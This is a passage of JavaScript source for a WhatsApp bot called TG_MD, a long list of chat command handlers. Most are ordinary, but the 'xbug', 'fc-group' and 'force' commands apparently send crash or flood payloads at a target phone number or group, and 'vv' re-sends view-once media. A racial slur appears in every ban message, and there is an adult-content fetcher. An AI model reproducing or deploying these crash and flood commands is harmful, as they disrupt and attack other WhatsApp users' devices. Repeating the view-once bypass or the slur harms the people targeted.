		await rich.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': case 'blocked': {
	if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
	 if (!isCreator) return m.reply("```for Owner only```.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await rich.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;
case 'creategc': case 'creategroup': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 if (!isCreator) return m.reply("```for Owner only```.");
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await rich.groupCreate(args.join(" "), [])
let response = await rich.groupInviteCode(cret.id)
teks = ` 「 Create Group 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@EVILtyi")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
  `
rich.sendMessage(m.chat, { text:teks, mentions: await rich.parseMention(teks)}, {quoted:m})
} catch {
reply("done check!")
}
}
break;
case 'brat': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
            if (!q) return reply(`Send command with text. ${prefix + command} rich`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, rich, m);
        }
       break;
  case 'furbrat': {
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
            if (!q) return reply(`Send command with text. ${prefix + command} rich`)
            const imageUrl = `https://fastrestapis.fasturl.link/tool/furbrat?text=${q}`
            await makeStickerFromUrl(imageUrl, rich, m);
        }
       break;
case 'tourl': {    
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return m.reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('../system/Data6');
    const uploadFile = require('../system/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    rich.sendMessage(m.chat, {
        text: `[\`\`\`HERE IS THE URL BY TG_ MD]\`\`\` \n*@EVILtyi* \n ${link}`
    }, { quoted: m });
}
break;
 
           case 'waifu': {
           if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 replygc(mess.wait)
await sleep(100);
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      rich.sendMessage(m.chat, {image:  imageBuffer, caption: `*•Random ${command}!* 🀄`}, {quoted: m})    
            }
            break
           case'nsfw': {
           if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  try {

    const apiUrl = 'https://draculazyx-xyzdrac.hf.space/api/hentai';
    console.log("API URL:", apiUrl);

    const response = await fetch(apiUrl);

    if (!response.ok) {
        console.error(`HTTP error! Status: ${response.status}`);
        throw new Error(`HTTP error! Status: ${response.status}`);
    }
    const contentType = response.headers.get('Content-Type');
    console.log("Content-Type:", contentType);

    if (!contentType || !contentType.includes('application/json')) {
        const text = await response.text();
        console.error("Received non-JSON response:", text);
        throw new Error(`Expected JSON, but received: ${contentType || 'no Content-Type'}.  Raw response: ${text}`);
    }

    const data = await response.json();

    if (data && data.videoUrl) {
      const videoUrl = data.videoUrl;
      const title = data.title;
      const description = data.description;
      const resolution = data.resolution;
      const thumbnailUrl = data.thumbnailUrl;

      const apiText = `
-  *Video Title:* ${title}\n
-  *Video Description:* ${description}\n
-  *Resolution:* _${resolution}_
`;

      await rich.sendMessage(
        m.chat,
        {
          video: { url: videoUrl },
          caption: apiText,
          footer: 'Hentai is a adult content, you have been warned', // Adiciona aviso sobre o conteúdo
        },
        { quoted: m }
      );
    } else {
      console.warn("premium-hentai: No video URL received from API or data is missing.");
      await rich.sendMessage(m.chat, { text: "Could not retrieve premium content. Please try again later." }, { quoted: m });
    }
  } catch (error) {
    console.error("Error during premium hentai retrieval:", error);
    await conn.sendMessage(m.chat, { text: `An error occurred while retrieving premium content. Please try again later. Error: ${error.message}` }, { quoted: m });
  }
  }
  break;
  case 'shorturl':{
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return m.reply('```*[ Wrong! ]* link/url```')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`*Error: Could not generate a short URL.*`);
let done = `*[ DONE BY TG_MD 🀄]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break;
case 'vv': {
if (!isCreator) return m.reply("```for Owner only```.");
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!m.quoted) return reply('Please reply to an image, video, or voice note (View Once included).');

    try {
        // Download the quoted media
        const mediaBuffer = await rich.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('⚠️ Failed to download media. Try again.\n_By TG_MD_');  
        }  

        // Determine the media type  
        const mediaType = m.quoted.mtype;  

        if (mediaType === 'imageMessage') {  
            await rich.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "🀄_HERE'S THE IMG\nBY TG_MD_"   
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await rich.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "✅ Here's the video\n_By TG_MD_"   
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await rich.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg', // Ensures proper voice note playback  
                ptt: true, // Sends it as a voice note  
                caption: "✅ Here's the voice note\n_By TG_MD_"   
            }, { quoted: m });
        } else {  
            return reply('⚠️ Unsupported format. Please reply to an image, video, or voice note.\n_By TG_MD');  
        }
    } catch (error) {
        console.error('Error:', error);
        await replyn('⚠️ An error occurred. Try again.\nUse .save if this doesnt work\n_By TG_MD');
    }
}
break;
//== ban function by TG_MD == //
case "ban": case "banuser": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (ban.includes(orang)) return m.reply(`*User ${orang.split('@')[0]} is already banned 🀄*`)
await ban.push(orang)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`\`\`\`user ${orang.split('@')[0]} banned from using the bot 🀄\`\`\``)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break;
case "unban": case "unbanuser":  {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!ban.includes(orang)) return m.reply(`\`\`\`User ${orang.split('@')[0]} not found in banlist 🀄\`\`\``)
let indx = ban.indexOf(orang)
await ban.splice(indx, 1)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`\`\`\`user  ${orang.split('@')[0]} unbanned your free to use the bot\`\`\``)
} else {
return m.reply(example("@tag/234XX/reply to chat"))
}}
break
case "listban": case "listbanuser": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
if (ban.length < 1) return m.reply("no banned users yet ")
let teksnya = `banned user here\n`
ban.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await rich.sendMessage(m.chat, {text: teksnya, mentions: [... ban]}, {quoted: m})
}
break;
// end ban function by richie 
case 'closetime': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('```admin first```!!')
if (!isBotAdmins) return reply('_Bot must be admin first 🀄_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
rich.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break;

case 'opentime': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('```admins only bro```!')
if (!isBotAdmins) return reply('```Bot must be admin first``` 🀄 _')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
rich.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break;
            case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
rich.groupRevokeInvite(m.chat)
}
break;
case 'everyone': 
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 rich.sendMessage(m.chat, {
text: "everyone" + m.chat,
contextInfo: {
groupMentions: [
{
groupJid: m.120363400223711119@newsletter,
groupSubject: 'heatless is him'
}
]
}
}
)
break;
case 'getpp':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await rich.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
rich.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;
case "get": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!/^https?:\/\//.test(text)) return m?.reply('Prefix *URL* with http:// or https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
m?.reply(`Content-Length: ${res.headers.get('content-length')}`)
}
if (!/text|json/.test(res.headers.get('content-type'))) return rich.sendMessage(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © King heatless Dev`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break;

case 'fact':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const bby = "https://apis.davidcyriltech.my.id/fact";

    try {
        const nyash = await axios.get(bby);
        const bwess = 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg';
        const ilovedavid = nyash.data.fact;
        await rich.sendMessage(m.chat, { image: { url: bwess }, caption: ilovedavid });
    } catch (error) {
        reply("An Error Occured.");
    }
    break;
    
case 'panel': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  reply(`
\`\`\`BUY A PANEL FROM heatless\`\`\`
\`\`\`\`THAT CAN LAST YOU UP TO 1MONTH\`\`\`
╚┈┈┈┈┈┈┈┈┈┈┈
DM if interested 
+2349039409985
+2349039409985
☝️☝️☝️Dm now`)
  }
  break;
case 'aza':
  case 'pay':
  case 'accnum':
  case 'account': {
  reply(`\`BANK DETAILS\`
  🀄 _*${global.bankowner}*_
  
  🔢 ${global.banknumber}
  
  🏦 _*${global.bankname}*_
  *SEND SCREENSHOT AFTER PAYMENT*`)
  }
  break;
  case 'hestless': {
  reply(`\`\`\`heatless IS HIM🀄\`\`\``)
  }
  break;
  case 'yts': case 'ytsearch': {
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
                if (!text) return reply(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                rich.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
  case 'tiktokgirl':
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokghea':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokbocil':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoksexy':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoksantuy':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokkayes':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktokpanrika':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'tiktoknot':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
rich.sendMessage(m.chat, { caption: m.success, video: { url: hasil.url }}, { quoted: m })
break;
case 'animewlp':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await rich.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: m.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break;
case 'sc':
case 'script':
case 'support':
case 'repo': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');

    const zipUrl = 'https://github.com/Kelvin12350/MEGA-MD/archive/refs/heads/master.zip';
    const filePath = path.join(__dirname, 'TG_MD.zip');

    // Download the ZIP file
    axios({
        method: 'GET',
        url: zipUrl,
        responseType: 'stream',
    }).then(response => {
        const writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);

        writer.on('finish', () => {
            // Send the ZIP file
            rich.sendMessage(m.chat, {
                document: fs.readFileSync(filePath),
                mimetype: 'application/zip',
                fileName: 'TG_MD.zip',
                caption: '```Here is the latest TG_MD ZIP file```😇'
            }, { quoted: m });

            // Prepare and send the follow-up message
            const followUpMessage = `*Hi @${sender.split("@")[0]} 🀄*

TG_MD  𝙍𝙀𝙇𝙀𝘼𝙎𝙀𝘿 𝙊𝙉 𝙂𝙄𝙏𝙃𝙐𝘽

🀄 *REPO LINK:* [https://github.com/Kelvin12350/MEGA-MD)
🀄 *CHANNEL LINK:* [https://whatsapp.com/channel/0029Vb6QmBO3LdQSbKC7F145]
🀄 *Support* : Don't forget to ⭐ Star & Fork the repo, and follow my channel!
🀄\`\`\`thanks to TG_MD MD 🚹 for the support also\`\`\`

> *𝘌𝘕𝘑𝘖𝘠😊*`;

            setTimeout(() => {
                rich.sendMessage(m.chat, {
                    text: followUpMessage,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: ownername,
                            body: 'hestless',
                            thumbnailUrl: 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });
            }, 3000); // Delay 3 seconds before sending the second message
        });

        writer.on('error', err => {
            console.error('Download error:', err);
            rich.sendMessage(m.chat, { text: '*Error downloading ZIP file!* 🀄' }, { quoted: m });
        });
    }).catch(error => {
        console.error('Request error:', error);
        rich.sendMessage(m.chat, { text: '*Failed to fetch ZIP file!* 🀄' }, { quoted: m });
    });
}
break;

case "play2":{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    replygc(mess.wait)
                if (!text) return reply(`\n*ex:* ${prefix + command} fucklove\n`)
                await reaction(m.chat, '🀄')
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                rich.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: m })
            }
            break;
case 'autobio':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
       if (!isCreator) return m.reply("```for Owner only```.");
                if (args.length < 1) return replyg(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break;
                case 'delpair':
  if (!q) return reply(`Example: ${prefix + command} 234xxx`);
  const dirPath = './lib2/pairing/';
  const folderName = fs.readdirSync(dirPath).find((file) => {
    return file.endsWith(`${q}@s.whatsapp.net`);
  });
  if (!folderName) return reply(`Folder not found: ${q}`);
  try {
    fs.rmdirSync(path.join(dirPath, folderName), { recursive: true });
    reply(`pair number deleted Successfully: ${folderName}`);
  } catch (err) {
    reply(`Error deleting paired device ${err.message}`);
  }
break;
case 'listpair':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("```for Owner only```.");
  try {
    const dirPath = './lib2/pairing/';
    const folderNames = fs.readdirSync(dirPath).filter((file) => {
      return fs.statSync(path.join(dirPath, file)).isDirectory();
    });
    reply(`List of paired device: ${folderNames.join(', ')}`);
  } catch (err) {
    reply(`Error listing: ${err.message}`);
  }
break;
case 'pair':
  if (isban) return reply('YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!isCreator) return m.reply("```for Owner only```.");
  if (!q) return reply(`Example:\n ${prefix + command} 234xxx`);

  target = text.split("|")[0];
  sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g,'') + "@s.whatsapp.net";

  var contactInfo = await rich.onWhatsApp(sjid);
  if (contactInfo.length === 0) {
    return reply("The number is not registered on WhatsApp");
  }

  const startpairing = require('./rentbot.js');
  await startpairing(sjid);
  await sleep(4000);

  const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
  const cuObj = JSON.parse(cu);

  // Send just the code first
  await rich.sendMessage(from, { text: `${cuObj.code}` }, { quoted: m });

  // Send the instructions next
  const instructions = `Use the above Code to become a bot.\n\n1. On your WhatsApp home page, click the three dots in the top right corner.\n2. Tap *Link Device*\n3. Tap *Link a device*\n4. Below, tap *Link with phone number instead*\n5. Paste your 6-character code.`;

  await rich.sendMessage(from, { text: instructions }, { quoted: m });
break;
case 'xbug': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("```for Owner only```.");
    if (!text) return reply("expamle: .xbug 234xxx");
    let targetId = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let LinkBokep = 'https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg'; // Ganti dengan URL gambar yang valid

    rich.sendMessage(m.chat, {
        image: { url: LinkBokep },
        caption: `*TG_MD 𝒃𝒖𝒕𝒕𝒐𝒏 𝒄𝒓𝒂𝒔𝒉: ${targetId}*`,
                            contextInfo: {
      forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400223711119@newsletter",
                serverMessageId: null,
                  newsletterName: `TG_MD 𝒄𝒓𝒂𝒔𝒉`
            },
                        mentionedJid: ['120363400223711119@newsletter'],
                    },
        footer: "heatless",
        buttons: [
            { buttonId: `.combo ${targetId}`, buttonText: { displayText: "⃟⏤͟͟͞𝘾𝙊𝙈𝘽𝙄𝙉𝙀⏤̭̪͟͞͞" }, type: 1 },
            { buttonId: `.iosx ${targetId}`, buttonText: { displayText: "⏤͟͞͞𝙄𝙊𝙎͟͟͞" }, type: 1 },
            { buttonId: `.invid ${targetId}`, buttonText: { displayText: "⏤͟͟͞𝘼𝙉𝘿𝙍𝙊͟͟͟͞͞﹏̰̇" }, type: 1 }
        ],
        headerType: 2,
        viewOnce: true
    }, { quoted: m });
}
break;
   case "abug":
        {
          reply("HERE ARE THE LIST OF NORMAL COMMMAD AVAILABLE 🀄\n◆ 𝒊𝒏𝒗𝒊𝒅 \n▲𝒊𝒐𝒔𝒙 \n■𝒄𝒐𝒎𝒃𝒐 ");
        }
        break;  
case "listgc":{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
let getGroups = await rich.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await rich.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
}
break;
case 'fc-group': {
if (!isPremium) return reply(`\`For Levi owner only.\``);
    if (!qtext) {
        return reply(`\`usage:\n${prefix + command} https:// or 1@g.us\``);
    }

    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) {
            return reply(` invalid group link.`);
        }

        try {
            let isTarget = await rich.groupAcceptInvite(groupId);
            reply(`\`\`\`success! ${command} sent to group with link: ${groupLink} [Group ID: ${groupId}]\`\`\``);

            for (let r = 0; r < 10; r++) {
                await Loc(isTarget, 90000, false);
                await delay(2000);
                await Loc(isTarget, 90000, false);
                await delay(2000);
            }
        } catch (err) {
            return reply(`\`failed to join group. maybe invalid or already joined\`.`);
        }

    } else {
        let isTarget = groupLink;
        reply(`\`success! ${command} sent to group with ID: ${groupLink}🍁\``);

        for (let r = 0; r < 10; r++) {
            await Loc(isTarget, 90000, false);
            await delay(2000);
            await Loc(isTarget, 90000, false);
            await delay(2000);
        }
    }
}
break;
case 'style': {
    if (args.length < 2) return reply('Usage: style <style_name> <text>\nExample: style fancy Hello World');

    const styleName = args[0].toLowerCase();
    const text = args.slice(1).join(' ');

    const styleMap = {
        fancy: (t) => t.split('').map(c => fancyCharMap[c] || c).join(''),
        cursive: (t) => t.split('').map(c => cursiveCharMap[c] || c).join(''),
        glitch: (t) => t.split('').map(c => glitchCharMap[c] || c).join(''),
        bubble: (t) => t.split('').map(c => bubbleCharMap[c] || c).join(''),
        // add more styles here
    };

    if (!styleMap[styleName]) {
        return reply(`Invalid style. Available styles:\n${Object.keys(styleMap).join(', ')}`);
    }

    const styledText = styleMap[styleName](text);
    reply(styledText);
    break;
}
case 'force': 
 if (!isPremium) return reply(mess.premium)
   if (!q) return reply(`invalid = \nUsage: ${prefix + command} 234x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`𝘉𝘜𝘎 ${prefix+command} 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘴𝘦𝘯𝘵. 
𝘱𝘭𝘦𝘢𝘴𝘦 \`𝑷𝒂𝒖𝒔𝒆 𝟓𝒎𝒊𝒏𝒔 𝒃𝒆𝒇𝒐𝒓𝒆 𝒖𝒔𝒊𝒏𝒈 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝒄𝒎𝒅\``)
     for (let r = 0; r < 50; r++) {
     await callHome(target, ptcp = true)
     await callHome(target, ptcp = true)
     await callHome(target, ptcp = true)
     await callHome(target, ptcp = true)
     }
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
⏤͟͟͞͞*TG_MD*⏤͟͟͞͞ 
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 `)
break;
 case 'addowner': case 'addown': {
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("```for Owner only```.");
    if (!args[0]) return m.reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    let checkNumber = await rich.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return m.reply("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./function/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    m.reply("Owner added successfully.");
}
break;
case 'delowner': case 'delown': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("Owner only.");
    if (!args[0]) return m.reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Owner removed successfully.");
}
break;
case "test":
        {
          reply("```active 🀄```");
        }
        break;
case 'addpremium': case 'addprem': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("for Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await rich.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return m.reply("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('../system/premium.json', JSON.stringify(Premium));

    m.reply("Success! User added to premium.");
}
break;
case 'delpremium': case 'delprem': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!isCreator) return m.reply("for Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
